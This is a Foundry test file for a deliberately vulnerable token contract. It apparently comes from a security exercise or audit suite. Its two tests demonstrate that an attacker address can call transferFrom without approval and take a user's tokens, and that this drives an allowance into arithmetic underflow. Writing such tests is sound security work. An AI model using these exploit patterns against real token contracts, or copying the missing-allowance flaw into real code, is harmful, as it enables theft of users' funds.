// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A18.sol";

contract A18Test is Test {
    VulnerableToken token;
    address admin = address(0x1);
    address user = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        token = new VulnerableToken();
        vm.prank(admin);
        token.transfer(user, 1000e18);
    }

    function testAllowanceBypass() public {
        // 1. User approves admin for 100 tokens
        vm.prank(user);
        token.approve(admin, 100e18);

        // 2. Attacker transfers WITHOUT approval
        vm.prank(attacker);
        token.transferFrom(user, attacker, 500e18); // Should fail but succeeds

        // 3. Attacker stole tokens
        assertEq(token.balanceOf(attacker), 500e18);
    }

    function testAllowanceUnderflow() public {
        // 1. User approves admin for 100 tokens
        vm.prank(user);
        token.approve(admin, 100e18);

        // 2. Attacker transfers more than allowance
        vm.prank(attacker);
        token.transferFrom(user, attacker, 500e18); // Causes underflow

        // 3. Check allowance underflow
        uint256 allowance = token.allowed(user, attacker);
        assertGt(allowance, 2**255); // Extremely large number
    }
}